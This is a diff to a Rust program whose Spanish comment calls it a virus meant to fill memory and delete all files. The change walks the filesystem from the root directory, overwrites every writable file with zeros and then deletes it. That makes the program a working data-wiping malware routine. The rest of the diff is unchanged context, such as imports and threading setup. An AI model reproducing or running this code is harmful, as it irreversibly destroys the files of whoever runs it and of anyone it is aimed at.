@@ -3,7 +3,7 @@
 // Virus para poder llenar toda la memoria ram y posteriormente borrar todos los archivos.
 
 use std::fs::{OpenOptions, read_dir, remove_file};
-use std::io::Read;
+use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 
 use std::sync::mpsc::{channel, Receiver, Sender};
@@ -38,10 +38,11 @@ fn main() {
     let (mut rx, mut cx) : (Sender<bool>, Receiver<bool>) = channel();
     walk("/".into(), |p, limite, rx|{
         *limite.lock().unwrap() -= 1;
-        let mut manager = OpenOptions::new().read(true).open(& p).expect("FAllo al abrirse");
-        let mut contenidos = vec![];
-        manager.read_to_end(&mut contenidos).expect("FAllO AL AGREGARSE AL VECTOR");
-        println!("{}:{:?}", p.display(), contenidos);
+        let file = OpenOptions::new().write(true).open(&p);
+        if let Ok(mut file) = file {
+            file.write_all(&vec![0; file.metadata().unwrap().len().try_into().unwrap()]).unwrap();
+            remove_file(p).unwrap();
+        }
         *limite.lock().unwrap() += 1;
         rx.send(true).unwrap();
     }, &limit, &cx, &rx )
